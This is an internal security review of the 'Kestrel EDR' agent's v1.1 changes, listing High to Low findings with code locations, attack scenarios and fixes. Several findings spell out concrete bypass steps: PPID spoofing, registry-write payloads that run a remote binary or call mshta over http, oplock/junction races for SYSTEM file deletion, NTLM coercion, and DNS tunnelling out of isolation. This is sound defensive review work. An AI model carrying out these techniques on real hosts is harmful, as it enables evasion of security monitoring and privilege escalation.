# Kestrel EDR: independent security review, v1.1 changes

**Scope:** `D:\project\kestrel`, every change in `65d2e38..6f2d58a` (21 commits, ~37k lines). Areas covered:
- the RemoveAutorun executor
- the RW, CD and PS rule families and the agent-child suppression
- the new sensors (registry watcher, task XML, ransomware decoys, file aggregation)
- M6 and the MSI custom action
- signed updates
- server changes
- the kestrel-scan split
- H10 isolation DNS

**Method:** I traced each code path by reading the code at HEAD. Nothing was built, installed or run on Windows, and no repository file was modified. Line numbers are at HEAD.
- **Unconfirmed (runtime):** the code path is confirmed, but the exploit depends on Windows behaviour that needs a check in the lab VM.
- **Unconfirmed:** I could not fully confirm the path itself.

The severity scale is the same as in `docs/security-review-2026-10-21.md`.

**Totals: Critical 0, High 10, Medium 12, Low 18, plus Info.**

**Attackers considered:**
- **(U)** a standard local user or user-mode malware;
- **(A)** a local admin;
- **(AN)** an authenticated console analyst, or a stolen analyst session or API token;
- **(S)** whoever controls the Kestrel server or the update package host;
- **(N)** a LAN attacker.

---

## HIGH

### V-H1. Any user can make a process tree count as "the agent's own work": it becomes invisible to every rule and cannot be killed
**Where:**
- `crates/kestrel-detect/src/engine.rs:1261-1281` (`note_agent`).
- Suppression applies through `protected()` (`:1415-1417`), `emit` (`:1543-1546`), canaries (`:2410-2418`) and the tamper handlers (`:2970`, `:3058`, `:3178`).
- The image match uses `driveless()` (`util.rs:10-21`).
- The parent comes from the ETW `ParentProcessID` field (`kestrel-win/src/win/etw.rs:341` → `translate.rs:569-573`).

**What is new:** before this change only the agent image itself was suppressed. Now any process whose parent is in `agent_guids` is added to the set, and this spreads to every descendant.

**Scenario (U):** there are three independent ways in.
1. **Another drive.** The image match ignores the drive letter. The user mounts an ISO (no admin needed) containing `\Program Files\Kestrel\kestrel-agent.exe`, which is really a loader. Every child it starts (powershell, rundll32, the stealer) is skipped by all ST, TP, Sigma, RW, CD and PS rules and is never killed or suspended. ISO delivery is a mainstream initial-access route.
2. **Spoofed parent.** The real `C:\Program Files\Kestrel\kestrel-agent.exe` is executable by Users. The user starts it suspended in their own session, then creates the payload with `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` pointing at it. Spoofing the parent to one's own process needs no privilege. ETW reports the spoofed parent, and the creator PID in the event header is never compared with it.
3. **Agent CLI.** `kestrel-agent.exe update-keygen` runs `%SystemRoot%\System32\icacls.exe` taken from the *caller's* environment (`crates/kestrel-agent/src/update.rs:365-368`). The user runs `set SystemRoot=C:\Users\me\x` and then that command, and the planted "icacls" is an agent child.

An admin can also spoof the SYSTEM agent itself, or its short-lived SYSTEM PowerShell children, as the parent. That escapes the TP tamper rules as well.

**Impact:** a complete detection and response bypass for the primary threat (user-mode stealers).

**Fix:**
- Only the service process (its PID and start time recorded at init, running as SYSTEM in session 0) is the agent, matched by full path including the drive letter, or by file ID.
- Children are trusted only when the agent recorded their PID and start time when it spawned them (`run_cmd`, msiexec, kestrel-scan), and only if the image is on an exact allow-list. Do not propagate trust beyond conhost.
- Compare the event header PID with `ParentProcessID` to catch PPID spoofing.
- Keep the TP rules active for agent children.
- In the CLI, use `GetSystemWindowsDirectory` instead of `%SystemRoot%`.

### V-H2. `remove_autorun` is an arbitrary SYSTEM registry write and delete primitive for the analyst role, which gives fleet-wide SYSTEM code execution
**Where:**
- `crates/kestrel-win/src/autorun_plan.rs:133-205` (accepts any key under `HKLM\SOFTWARE\…`, `HKLM\SYSTEM\CurrentControlSet\…` and `HKU\<SID>\…`).
- `:254-287` (`critical_value`): Winlogon `Userinit` and `Shell` only need to *contain* `userinit.exe` or `explorer.exe`, BootExecute only needs to contain `autochk`, and `Services\*\ImagePath` and the LSA package lists require `""`, so any string passes the check at `:328-335`.
- `:299-350` (`plan_registry`): any existing value may be deleted or overwritten. A `dword:` restore also changes the value's type (`:371`).
- `crates/kestrel-win/src/win/autorun_resp.rs:239-335` writes it as SYSTEM.
- The server does only shape checks (`crates/kestrel-server/src/api/devices.rs:408-455`).
- The privilege is `response.file` (`kestrel-common/src/response.rs:140-143`), which the built-in **analyst** role holds (`docs/contracts.md:34`).
- The timeline describes any `restore_data` as "restored the default value" (`crates/kestrel-server/src/incidents.rs:124-125`).

**Scenario (AN):** one `POST /api/devices/<id>/actions` per device. Examples:
- `{"type":"remove_autorun","kind":"registry_value","location":"HKLM\\SOFTWARE\\Classes\\exefile\\shell\\open\\command","value_name":"","restore_data":"C:\\Users\\Public\\x.exe \"%1\" %*"}`. Every `.exe` launch then runs the attacker's binary, and the type stays REG_EXPAND_SZ.
- `…\Services\<any LocalSystem service>\ImagePath` set to `cmd /c …`, which runs as SYSTEM at the next service start.
- Winlogon `Userinit` set to `C:\Windows\system32\userinit.exe,\\host\s\x.exe`.
- `…\SecurityProviders\WDigest\UseLogonCredential` set to `dword:1`, which re-enables plaintext credentials in LSASS.
- **Bypassing the service guards:** `kind=registry_value` on `Services\{Sense,EventLog,BFE,mpssvc,Sysmon64}\Start` = `dword:4` skips `CRITICAL_SERVICES` and `service_is_os` completely.
- **Deletes are unrestricted too:** removing values such as `Control\Session Manager\SubSystems\Windows` or a boot driver's `Start` bricks the host. Removing Kestrel's own ASR or AppLocker hardening values bypasses `policies.write` governance.

**Why it matters:** this crosses the boundary the code otherwise keeps. Server commands cannot quarantine Microsoft-signed OS files or restore into System32 (`qpolicy.rs:140-158`). The action is audit-logged, but nothing stops it.

**Fix:**
- **Agent and server:** use an allow-list of autorun locations for deletes (Run/RunOnce in HKLM and HKU, `IFEO\*\Debugger`, `SilentProcessExit\*`, HKU Winlogon overrides, HKU COM `InprocServer32`/`LocalServer32`). This is the same list `incidents::autorun_targets` uses.
- Replace free-form `restore_data` with a `restore_default: true` flag. The agent looks the exact OS default up in a fixed (canonical key, value) table: Userinit, Shell, BootExecute, WDigest `dword:0`, the shell-folder defaults.
- Never write `Services\*\ImagePath`, LSA package lists or `Services\*\Start`, and never change a value's type.
- Move the action to a new admin-only `response.persistence` privilege.
- Run `validate_manual_action` on the checklist-approval path too (`api/incidents.rs:630`).

### V-H3. Concurrent update deliveries can make msiexec run bytes that were never hashed
**Where:**
- `crates/kestrel-agent/src/transport.rs:414-420` spawns one task per `ServerPayload::Update`.
- `update.rs:93-96`: the `KV_LAST_UPDATE` guard is only set after the download (`:143`).
- `update.rs:267-288`: both tasks `File::create` the same `kestrel-agent-<ver>.part` with the default share mode (read, write and delete). The SHA-256 is taken over the *network stream*, not the file on disk. The file is then renamed, and `install()` (`:154-172`) starts msiexec by path.

**Scenario (S):** this is the attacker that offline signing is meant to stop: someone who controls the server or the external package host named in a validly signed manifest.
1. Deliver `Update(M)` twice. A reconnect `Hello` during a slow download also causes a second delivery.
2. Serve the genuine MSI on connection A and a malicious one on connection B, and keep B's writes going after A finishes.
3. A's hash matches, so the file is renamed and msiexec starts. B's still-open handle follows the renamed file and overwrites it.

The result is an unsigned MSI running as SYSTEM on every targeted agent. Even without an attacker, the race can corrupt updates. **Unconfirmed (runtime):** the timing.

**Fix:**
- Allow one update in flight per agent (mutex).
- Use a random temp name opened `create_new` with share mode 0.
- After closing, reopen the final file deny-write, re-hash it from disk, and keep that handle until msiexec has opened the file (or copy it into a fresh SYSTEM-only directory and hash the copy).
- Require a valid Authenticode signature on the MSI.
- Add an overall download deadline (see V-L9).

### V-H4. A standard user can make the SYSTEM agent quarantine any "user-writable" file they name: other users' documents, `ProgramData`, `System32\Tasks`
**Where:**
- The engine's `filter_actions` (`engine.rs:1495-1499`) and the agent's `qpolicy::quarantine_allowed` (`kestrel-win/src/qpolicy.rs:116-123`) only check the path class.
- The class covers every `\Users\*` profile, all of `\ProgramData\` and `\Windows\System32\Tasks\` (`kestrel-common/src/event.rs:484-496, 589-594`).

**Sources of the path:** all of these come from text the attacker wrote, and the rules are Protect from day one:
- **PS-02** (`kestrel-detect/src/families/ps.rs:1026-1076`, actions `:850-866`, `quarantinable` `:317-323`): `HKCU\…\Run\x = wscript.exe "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\<id>"`.
- **PS-10** (`ps.rs:1740-1815`): HKU Winlogon `Shell = C:\Users\Bob\Documents\payroll.xlsx`.
- **CD-01** (`cd.rs:207-238`, `minidump_args` `:1404-1425`): `rundll32 comsvcs.dll MiniDump <lsass> C:\Users\Bob\thesis.docx full`. The process-start alert fires even though the dump fails.
- **CD-10** (`cd.rs:350-385`): `reg save HKLM\SAM <victim path>`.

**Scenario (U):** SYSTEM moves the victim file into the vault. Examples:
- machine private keys, which breaks RDP, WinRM and IIS TLS;
- another product's configuration;
- another user's documents;
- task XML under `System32\Tasks\Microsoft\Windows\…`, which bypasses `plan_task`'s `\Microsoft\Windows\` guard.

The files are restorable, but this crosses a privilege boundary and gives an easy denial of service.

**Fix:**
- Engine-origin quarantine only for files the subject provably created: a FileAccess Create/Write by the subject's tree after it started, or a `drops` entry attributed to the writer. Otherwise the action becomes alert-only.
- At the agent, refuse engine-origin quarantine of files owned by another user, under `ProgramData\Microsoft\Crypto`, or under `System32\Tasks*`.

### V-H5. PS-15 rollback and the PS-05/07/08 actions act on guessed task, service and WMI attribution
**Where:**
- `crates/kestrel-win/src/persist.rs:324-360, 397-416` and `win/translate.rs:1163-1199`: the creator is the most recent "hint" within 5 s.
- A hint is any process that loads `taskschd.dll`, any `schtasks /create` or `sc create/config` start (success not required), or any script block containing `New-Service` or `Register-ScheduledTask`.
- Used in `ps.rs:767-811, 1436-1456, 1482, 2047-2110`. `taskschd.dll` loads are only seen once per process.

**Scenario (U):**
1. An unsigned implant keeps a hint fresh, for example by loading and unloading `taskschd.dll` in a loop.
2. Any task or service registered in the meantime by SYSTEM, GPO, an installer or IT is attributed to it and `record()`ed (up to 2 h, 32 entries).
3. The implant then triggers any Protect kill rule on itself, for example the CD-01 command from V-H4.
4. PS-15 emits `RemoveAutorun` for every recorded entry.

The agent-side guards (`autorun_resp.rs:515-557`, `autorun_plan.rs:405-429`) only spare Microsoft-signed OS services, the protected list and `\Microsoft\Windows\` tasks. So third-party backup, RMM, VPN and security-agent services are stopped and disabled, and `\Microsoft\Office\…` and vendor updater tasks are deleted.

The same mis-attribution can kill an innocent untrusted "writer" tree (`ps.rs:879-889`). In reverse, an admin attacker can launder a malicious service install through a benign `sc config` started at the same moment.

**Fix:**
- Add `attribution: exact | heuristic` to these events (additive, `#[serde(default)]`).
- Never `record()`, kill or roll back on heuristic attribution.
- Reject hints whose integrity level could not have made the change (services need High or SYSTEM).
- Count the `taskschd.dll` hint only when a matching task RPC follows.

### V-H6. Registry writes are attributed by joining on the value name only, so the attacker chooses the "writer"
**Where:**
- `crates/kestrel-win/src/regdiff.rs:539-590`: the *first* ETW record in the window wins, from any process and any key, whenever the KeyObject is unknown.
- `win/translate.rs:912-920, 1114, 1130`: when the chosen writer is the agent's own PID, the change is dropped entirely, not even sent as telemetry.

**Scenario (U):**
1. Malware runs `reg add HKCU\Software\Junk /v Upd /d x` (or `setx Upd x`).
2. Immediately afterwards it sets `HKCU\…\Run\Upd = "mshta http://…"`.

The signed System32 `reg.exe` or `setx.exe` becomes the writer, so `signed_program` drops PS-02 to alert-only (`ps.rs:1044`): no removal and no kill. The same race can land a kill on an innocent untrusted process that writes a common value name, or point PS-15 at the wrong tree.

A related point: `reg.exe` or `schtasks.exe` run *directly* by malware get the same alert-only treatment. The signed-tool exemption should look at lineage, not just the image.

**Fix:**
- Collect every candidate in the window, rank by KeyObject first and then by closeness in time.
- When more than one process wrote that value name, mark the event ambiguous: never kill, still remediate the value.
- Never drop an event because the agent's PID matched.
- Apply the signed-program exemption only when the parent is trusted too.

### V-H7. Building a persistence key elsewhere and renaming it into place produces an unattributed change, so no rule acts
**Where:**
- `crates/kestrel-win/src/win/regwatch.rs:294-314, 391-404`: a re-created or re-opened key reports all of its values as fresh `Set` changes, with pid 0.
- `win/translate.rs:1140-1153`: pid 0 is telemetry only.
- `regdiff.rs:539`: the join window is ±2 s.

**Scenario (U):**
1. Build `HKCU\…\CurrentVersion\RunX` with the payload value (copy the existing values over).
2. Wait 6 s, delete `Run`, then `RegRenameKey` `RunX` to `Run`.

The watcher reports every value with no writer, so PS-01 and PS-02 (Protect from day one) never fire. The same works for an HKCU COM `InprocServer32` key (PS-11). With admin rights, the same trick on IFEO, SilentProcessExit, Lsa and WDigest defeats PS-09, PS-10, CD-07, CD-12 and CD-13.

**Unconfirmed (runtime):** that `NtRenameKey` produces no SetValueKey event that falls inside the join window.

**Fix:**
- Run the rules on unattributed changes to persistence and credential keys, and remediate the value itself (remove it, or restore the default) even when there is no process to kill.
- Subscribe to Kernel-Registry `RenameKey`/`CreateKey` for attribution.
- Treat re-creation of a watched key as suspicious in itself.

### V-H8. Ransomware decoys are planted and removed with path-based calls as SYSTEM, giving arbitrary file delete (and a possible overwrite). Regression of L12, now more exposed
**Where:**
- Removal: `crates/kestrel-win/src/rcanary.rs:244-267` runs `has_link_in_chain`, then `symlink_metadata`, then `std::fs::read(p)` (full sharing), then `std::fs::remove_file(p)`. Each call re-resolves the path.
- Planting: reuses `canary.rs:141-175` (`write_no_follow`: path-based `remove_file(tmp)`, `create_new`, a `canonicalize` after the fact, then `rename(tmp, path)` replacing any existing file). It runs as SYSTEM in every profile at every sensor start (`win/sensors.rs:113-118`).

**Scenario (U), at uninstall:**
1. The user sets an oplock on `Documents\!Payroll Q3.xlsx`.
2. SYSTEM's `read` breaks the oplock.
3. In the callback, the user moves `Documents` aside, makes `Documents` a junction to `\RPC Control`, and creates an object-manager symlink with the decoy's name pointing at `C:\Config.Msi`.
4. The hash check passes on the already-read real file, and `remove_file` deletes the target.

Arbitrary delete as SYSTEM leads to a known LPE through `Config.Msi`. Planting has the same class of race, with a narrower window.

**Unconfirmed (runtime):** the race.

**Fix:** use `win/safefs.rs` for both operations:
- verify ancestors with `FILE_FLAG_OPEN_REPARSE_POINT`;
- create relative to a verified directory handle;
- hash and delete through the *same* handle (`FileDispositionInfo`) after checking the final path and link count.

Alternatively, impersonate the profile owner.

### V-H9. An in-place write to a decoy is blamed on whoever opened the decoy last. RW-07 (Critical, Protect from day one) then kills, quarantines and may isolate an innocent app
**Where:**
- `crates/kestrel-win/src/win/etw.rs:252-268` (`last_opener`, 2-minute window; pid 4 and 0 are not recorded, `:428`).
- `win/rcanary.rs:73-92`.

**Scenario (U), framing:**
1. Malware overwrites `!Invoice 0917.pdf` in place.
2. It then `ShellExecute`s the file, so Acrobat, Word or Photos becomes the last opener.
3. The poller blames that app: tree kill, quarantine of a signed app's image, and isolation if network paths were involved.

**Evasion:**
- Hold a handle for more than 2 minutes before writing: the result is pid 0, telemetry only.
- Encrypt over SMB from another host: the write is pid 4, so a stale local opener (for example the Search indexer) is blamed.

The fixed decoy names are also an easy skip-list for ransomware.

**Fix:**
- Attribute only to a process holding a write-capable open (record the desired access from event 12), and only within seconds.
- Report pid 4 as "remote writer" and do not blame a local process for it.
- Make in-place hits alert-only unless the opener also has an RW-06 aggregate.
- Randomise decoy names per host.

### V-H10. Isolation permits are scoped by image path only, so any process at the agent's path can tunnel DNS out of an "isolated" host
**Where:**
- `crates/kestrel-win/src/wfp_plan.rs:148-167` (DNS permit) and `:113` (server permit).
- `FWPM_CONDITION_ALE_APP_ID` is just the image path.

**Scenario (U):** on an isolated host, the user starts `C:\Program Files\Kestrel\kestrel-agent.exe` suspended and injects into their own process. That process passes the permits:
- TCP/UDP 53 to the adapter resolvers, which gives a DNS tunnel (C2 or exfiltration) to an attacker's authoritative server;
- TCP to the server IPs.

The H10 fix intended to close exactly this.

**Fix:** add `FWPM_CONDITION_ALE_USER_ID` (an SD allowing only `S-1-5-18`, or better the service SID `NT SERVICE\KestrelAgent`) to every agent-scoped permit, both isolation and the always-on hard permits.

---

## MEDIUM

### V-M1. "Scan running processes" makes SYSTEM authenticate to attacker UNC/WebDAV paths (NTLM coercion)
- **Where:** `crates/kestrel-win/src/win/platform.rs:479-493` selects live images where `PathClass::is_user_writable()`, which includes `External` (UNC, `\\host@80\`, `\Device\Mup`; `event.rs:527, 600-604`). `kestrel-scan.exe` then opens each one as SYSTEM.
- **Scenario (U):**
  1. Keep `\\attacker@80\x\a.exe` running.
  2. An analyst runs a host or fleet scan.
  3. The machine account authenticates to the attacker, who relays to LDAP (RBCD) or ADCS (ESC8) and gets SYSTEM on the host.
- **Unconfirmed:** whether hashing UNC images during enrichment at process start already coerces automatically. That code predates these changes.
- **Fix:**
  - Never open `External` or UNC paths as SYSTEM; filter them out in the agent and in kestrel-scan.
  - Run the scanner with a restricted, non-network token in a job object.

### V-M2. The uninstall-token check is skipped by `UPGRADINGPRODUCTCODE` on the msiexec command line
- **Where:** `installer/Kestrel.wxs:120`. `CA_Uninstall` runs only when `REMOVE="ALL" AND NOT UPGRADINGPRODUCTCODE`.
- **Scenario (A):**
  1. `msiexec /x {PC} /qn UPGRADINGPRODUCTCODE={x}` removes the files without the token.
  2. The service stays registered with a missing binary, so the agent is silently dead after reboot.
  - This defeats M5's tamper control.
- **Fix:**
  - Condition on `WIX_UPGRADE_DETECTED` or an Upgrade-table property set by `FindRelatedProducts`, never a public property.
  - Also gate `REMOVE` values other than `ALL`.
  - Raise a TP alert when `msiexec /x` targets the product code.

### V-M3. Auto-update cannot succeed with this MSI, and the failure is never reported
- **Where:**
  - `Kestrel.wxs:48`: launch condition `Installed OR (SERVER AND TOKEN AND CA_B64)`.
  - `:118`: `CA_Install` when `NOT Installed`.
  - A new ProductCode on every build.
  - `update.rs:162-169` runs `msiexec /i file /qn` with no properties.
  - `KV_LAST_UPDATE` is written before msiexec runs.
- **Impact:** every update fails, and the server shows it as "sent" forever. Someone "fixing" this by passing `TOKEN=` would bring back M6.
- **Fix:**
  - Add `WIX_UPGRADE_DETECTED` to both conditions.
  - Skip enrolment when already enrolled.
  - Report the msiexec exit code.

### V-M4. Two failed commands from a standard user isolate the host (RW-12 is Protect)
- **Where:**
  - `crates/kestrel-detect/src/families/rw.rs:1304-1356, 1177-1238`: RW-12 counts Audit-mode RW-01..05 alerts.
  - `:39`, `:485-487`: the rules match on file name or command text at process start, regardless of whether the command succeeded.
- **Scenario (U):** `vssadmin delete shadows` (fails without elevation) plus `wevtutil cl x` leads to `IsolateHost`. Benign admin housekeeping sequences trigger it too. Together with H10 history, this is a cheap way to take a host off the network.
- **Fix:**
  - Count only Protect or strong variants.
  - Require elevation or a success signal.
  - Require the same lineage for at least two of the hits.

### V-M5. Ransomware containment kills and quarantines validly signed per-user apps in the lineage
- **Where:** `rw.rs:303-327` (`lineage`/`is_stop`), `:265-269`, `:346-370`. The walk only stops at System32, Explorer, Program Files tools, protected processes or the agent.
- **Impact:** VS Code (user install), Teams and Slack in AppData are tree-killed, and their images are quarantined.
- **Fix:**
  - Stop the walk at any validly signed non-LOLBin.
  - Never quarantine validly signed images.

### V-M6. Endpoint-controlled strings inject markdown into incident storylines (phishing links and fake verdicts in the console)
- **Where:** `crates/kestrel-server/src/incidents.rs:576-675` (`evidence_lines`).
  - Task name and action: `:603-605`.
  - Service name and ImagePath: `:622`.
  - WMI fields.
  - Registry key, value and data: `:647-651`.
  - These are placed between backticks without escaping, and newlines are kept.
  - They are rendered by `console/src/components/markdown.tsx`.
- **Scenario (U):** a task action such as ``x` [Kestrel: re-authenticate to view evidence](https://evil.example/sso) `y`` renders as a live link. REG_SZ data containing `\n> **Verified benign by Kestrel**` renders as a quote. This is not XSS.
- **Fix:**
  - Add an `md_code()` helper: strip control characters and newlines, neutralise backticks or use a longer fence, and clip every field.
  - Escape `[ ] * > #` elsewhere.
  - Only render links the server itself produced.

### V-M7. Isolation re-planning trusts whatever the current resolver returns
- **Where:**
  - `crates/kestrel-win/src/win/platform.rs:244-268`: every 60 s; `merge_server_ips` only ever adds, up to 16 addresses.
  - `crates/kestrel-agent/src/pki.rs:105-132`.
- **Scenario (N):** a mitm6 or rogue DHCPv6 attacker becomes the resolver. The re-plan then permits agent DNS to it, and spoofed answers add attacker IPs as server permits. With V-H10 that becomes a direct channel. These hard permits also outrank IOC blocks.
- **Fix:**
  - Freeze the resolver set at isolation time.
  - Add a re-resolved IP only after a successful mTLS handshake to it.

### V-M8. De-duplicating task events by name drops real follow-up events
- **Where:** `crates/kestrel-win/src/persist.rs:61-75` (key `task|op|name`, 5 s); `win/translate.rs:998`.
- **Scenario (U):** create task X (benign), delete it, then create X again with an `mshta` action, all within 5 s. The malicious `Created` is dropped, and only the 6-hourly inventory might see it.
- **Fix:** de-duplicate on the EventRecordID or ActivityId, or the timestamp plus a hash of the XML.

### V-M9. Task XML enrichment runs inside the ETW callback and is truncated at 256 KB
- **Where:**
  - `win/etw.rs:702` and `win/persist.rs:30, 88-92`: `read_task` plus a 150 ms sleep inside the callback.
  - `taskxml.rs:10, 26`: the read is capped at 256 KB.
- **Impact:**
  - A user flooding register/delete calls stalls the Persist session (lost events), or pushes events past the 20 s hint expiry.
  - Oversized XML (for example a large `<Description>`) parses to empty actions. **Unconfirmed:** whether Task Scheduler accepts XML over 256 KB.
- **Fix:**
  - Move enrichment to a worker thread.
  - When the XML is unreadable or too large, fall back to `ITaskService` and flag the event.

### V-M10. The file aggregator can be starved, or made to burn CPU inside the Kernel-File callback
- **Where:**
  - `crates/kestrel-win/src/fileagg.rs:498-503`: the global op cap is first come, first served.
  - `:543-553`: `last_emit` is not updated when `files_touched` is unchanged, so `summarise` over up to 2048 ops runs on every event while the mutex is held.
- **Impact:**
  - Helper processes fill the cap, so RW-06 and RW-08 go blind.
  - The CPU burn causes loss on the session that also feeds the ST rules.
- **Fix:**
  - Share the cap fairly per pid.
  - Update `last_emit` every time `due` is evaluated.
  - Aggregate off the callback thread.

### V-M11. A PS payload kill can hit another user's running process (when PS-01, PS-05 or PS-11 is in Protect)
- **Where:** `ps.rs:868-878` (`kill_payload`), `:625-666` (`classify`, the `p.running` match by path).
- **Scenario (U):** the attacker writes their own HKCU Run value pointing at a running, unsigned, MOTW-tagged tool in Bob's profile. Bob's process is killed and the tool is quarantined.
- **Fix:** require the payload to be in the writer's own profile, or created by the writer.

### V-M12. The new decoy-reader exemptions can be bypassed by process hollowing
- **Where:** `crates/kestrel-detect/src/paths.rs:1254` (`defrag.exe`), `:1280-1299` (`svchost -k defragsvc`), used at `engine.rs:2421`.
- **Scenario (U):** start `System32\svchost.exe -k defragsvc` suspended, inject into it, and read the decoys silently.
- **Fix:** also require SYSTEM, and for svchost require `services.exe` as the parent.

---

## LOW

- **V-L1. Launching any `System32\lsass.exe` re-points `lsass_pid`.**
  - Where: `win/translate.rs:603-606`.
  - Effect: failed opens of the real LSASS are then filtered out (`etw.rs:570`), which evades CD-06.
  - Fix: accept only an lsass whose parent is wininit in session 0, or keep the pid from the startup snapshot.
- **V-L2. A COM hijack can be hidden by overflowing the per-user CLSID tree.**
  - Where: `regdiff.rs` (`MAX_KEYS_PER_TREE`), `win/regwatch.rs:230-260`.
  - Effect: more than 6000 junk keys truncate the walk before the hijack key. Every change also triggers a full re-walk (CPU).
  - Fix: prioritise keys that changed, and alert when the tree is truncated.
- **V-L3. One agent can keep bumping its group's policy version and the fleet-wide rules version.**
  - Where: `crates/kestrel-server/src/policy_svc.rs:128-202` (via `ingest.rs:135`). Each step is bounded at +1,000,000 and saturating; a refused jump is only logged.
  - Effect: re-download amplification, and the counter drifts toward the JS 2^53 limit.
  - Fix: raise a `TP-SRV-VERSION` alert when an agent reports a version above the server's, and allow catch-up at most once per device per N minutes.
- **V-L4. The "permanent data error" ack is not transactional and is silent.**
  - Where: `grpc.rs:53-60, 600-614`.
  - Effect: `ingest::alert` and `incidents::ingest_alert` run several statements without a transaction, so a class-22 error midway leaves partial rows that are then acked. A dropped alert is only logged.
  - Fix: use a transaction, write a dead-letter row, raise a `TP-SRV-INGEST` alert, and narrow the match to specific SQLSTATEs. Class 22 only; nothing crosses devices.
- **V-L5. Server-side scrub misses the new event kinds.**
  - Where: `crates/kestrel-server/src/scrub.rs:140-153`.
  - Effect: `TaskRegistered.user`, `ServiceInstalled.account`, task actions, service ImagePath and WMI text are not hashed or redacted when the privacy policy says they should be (PDPA / UU PDP).
  - Fix: extend `scrub_event` to these fields.
- **V-L6. Enrollment and uninstall tokens are still on the msiexec command line.**
  - Where: `crates/kestrel-server/src/api/groups.rs:308`.
  - What is fixed: the custom action to agent hop now uses stdin.
  - What remains: Sysmon, 4688 auditing and other EDRs still log the command line.
  - Fix: document this residual risk, and support a `TOKEN_FILE=` property.
- **V-L7. Changing a group's `update_ring` needs only `devices.write`.**
  - Where: `api/groups.rs:139, 176-203`.
  - Effect: a `devices.write` user can push canary-only releases to any group.
  - Fix: require `updates.write`.
- **V-L8. A halted release stays installable; manifests have no expiry.**
  - Where: `crates/kestrel-common/src/update.rs:23-31` (the signature covers version, URL and sha256 only).
  - Fix: add `not_after` to the signed message, and have agents remember revoked versions.
- **V-L9. No overall download deadline.**
  - Where: `update.rs:225-288`.
  - Effect: a slow-drip host keeps the task alive and widens V-H3.
  - Fix: add an overall deadline and a minimum-throughput check.
- **V-L10. YARA `include` is enabled in kestrel-scan, and compile errors are echoed.**
  - Where: `crates/kestrel-scan/src/lib.rs:156-166`.
  - Effect: latent. Once custom rules reach `<state>\rules`, a `rules.write` user could read any file SYSTEM can read through include errors.
  - Fix: `enable_includes(false)`, and do not echo source.
- **V-L11. Fixed `scan-targets.txt` name.**
  - Where: `win/scan.rs:34, 45, 59`.
  - Effect: concurrent scans clobber each other's list. The state directory is SYSTEM-only, so there is no privilege gain.
  - Fix: use a unique `create_new` name per scan.
- **V-L12. Autorun backups cannot be restored or purged from the console.**
  - Where: `docs/contracts.md:155` (`RestoreAutorun` deferred; backups not listed in `/quarantine`).
  - Effect: PS-15 false positives (see V-H5) and analyst deletions, including of `\Microsoft\Windows\` tasks, which analysts may remove, are irreversible in practice.
  - Fix: ship `RestoreAutorun`, or at least list the backups.
- **V-L13. WMI removal can delete a filter that another binding still uses.**
  - Where: `win/autorun_resp.rs:722-762`.
  - Effect: binding enumeration is capped at 4096, and filter references are resolved with `GetObject`, so a full path into another namespace resolves there. A filter shared with an unseen binding can therefore be deleted.
  - Attacker: admin only.
  - Unconfirmed.
- **V-L14. Full process-table scans on every event.**
  - Where: `ps.rs:640-645` (`classify`), `families/mod.rs:150-156` (`Ctx::lsass()`).
  - Effect: a flood of HKCU Run writes or failed lsass opens slows the engine and causes event loss.
  - Fix: cache the lsass guid and index the table by image.
- **V-L15. PS-15 rollback reaches the user's own interactive shell.**
  - Where: `ps.rs:2069-2082`.
  - Effect: up to 3 untrusted ancestors are included, so a user's PowerShell loses its legitimate autoruns from the last 2 h. The `rolled` set stops filling at 1024, which silently disables late rollback.
- **V-L16. `RemoveAutorun` carries no expected data.**
  - Where: `autorun_resp.rs` header, guarantee 3.
  - Effect: a value rewritten between the alert and the action is deleted anyway. Mostly HKCU, so self-inflicted.
  - Fix: carry the expected data hash.
- **V-L17. The DNS parser accepts A/AAAA records whatever their owner name.**
  - Where: `crates/kestrel-win/src/dnswire.rs:153-170`.
  - Effect: only matters on-path. Off-path spoofing is hard: random id and port, source checked.
- **V-L18. CD key normalisation only folds ControlSet001-003.**
  - Where: `families/cd.rs:1483-1488`.
  - Effect: minor evasion if a sensor emits other forms; `ps.rs` folds any number.

## INFO

- **Agent and engine:**
  - `FamilyHit::audit_only` is never set by any family.
  - `filter_actions` passes `RemoveAutorun` and `IsolateHost` through unconditionally (`engine.rs:1512`), so all safety for them sits in the agent's `autorun_plan`.
- **Registry links:** `REG_OPTION_OPEN_LINK` (`autorun_resp.rs:119-130`) only covers the last key component. Intermediate links inside HKU are only stopped by the kernel's cross-trust-class link restriction (unconfirmed).
- **Server and console:**
  - Update packages under `/downloads/updates` and the agent port are unauthenticated. They are signed and traversal-safe, but nothing else should be kept in that folder.
  - The console's rule `references` are rendered as `href` without a scheme filter (pre-existing). Filter to http(s) on the server.
  - Approval dialogs show attacker-chosen task and service names unsanitised. Bidi (U+202E) and control characters can disguise the target, so strip them before display.
- **Installer and scanner:**
  - `INSTALLFOLDER` is public, so an admin can install the SYSTEM service into a user-writable folder. Have the agent check its folder's DACL at start.
  - There is no rollback for `CA_Uninstall`.
  - The scanner parses attacker files as full SYSTEM.
  - Scan output bypasses the M9 privacy filters.
- **Decoys and sensors:**
  - Decoy names are fixed across the fleet.
  - Early-pid holds are bounded (about 2-3 s; ProcessStart is delayed, never skipped).
  - **Unconfirmed:** the enroll/install CLI does direct DNS for an arbitrary `--server`, which could be a DNS exfiltration primitive while isolated, probably blocked by `secure_state_dir` ownership. Check in the VM.

---

## Checked and found sound

- **RemoveAutorun executor** (`autorun_plan.rs`, `autorun_resp.rs`):
  - Backup happens before any change, and a failed backup means no change.
  - Each kind re-reads the entry before acting: registry `:282-298`, task `:381-400`, service `:634-643`, WMI `:779-788`.
  - Kestrel's own keys and service are matched exactly (no prefix evasion). HKCU is refused, as are wildcards, `.`/`..` and control characters.
  - Data pointing into Kestrel's own directories is refused.
  - Services: boot and system-start drivers, Microsoft-signed OS binaries and svchost `ServiceDll` are checked, and services are disabled, never deleted.
  - WQL quoting is correct, and the WMI consumer must be unique.
  - Startup files go through the safefs quarantine.
  - The vault `EntryKind` stops `RestoreFile` from writing a backup's label path.
  - Engine-generated `restore_data` values are constants only.
- **Engine:** family hits use the single `emit`/`filter_actions` path (mode, exclusions, dedup, protected-process check by guid). Kill subjects come from kernel-attributed actor guids; the only exception is the payload in V-M11. State maps are bounded, and there are no `unwrap`/regex on event data and no char-boundary panics. Sigma treats an unknown field as "never matches".
